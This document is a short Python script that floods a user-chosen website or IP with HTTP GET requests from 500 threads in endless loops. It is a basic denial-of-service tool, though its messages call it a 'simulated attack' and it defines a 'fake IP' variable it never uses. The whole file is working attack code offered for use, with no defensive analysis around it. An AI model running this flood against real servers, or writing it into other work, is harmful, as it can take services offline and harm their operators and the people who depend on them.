import socket
import threading
import sys

# Get user input for target and port
target = input("Enter target website/IP: ")
port = input("Enter port number (default=80): ")
port = int(port) if port.strip() else 80  # Default to port 80 if input is empty
fake_ip = "182.21.20.32"  # Fake IP (not actually used for real spoofing)

def attack():
    """ Continuously sends HTTP GET requests to the target. """
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
            s.send(request.encode())
            s.close()
        except KeyboardInterrupt:
            print("\n[!] Stopping attack...")
            sys.exit()
        except Exception as e:
            print(f"[!] Error: {e}")

# Start multiple threads
thread_count = 500  # Adjust based on your testing needs
print(f"Starting {thread_count} threads...")

try:
    for _ in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.daemon = True  # Ensures threads stop when the script stops
        thread.start()

    print("Simulated attack started. Press Ctrl+C to stop.")
    while True:
        pass  # Keep the script running
except KeyboardInterrupt:
    print("\n[!] Script stopped by user.")
    sys.exit()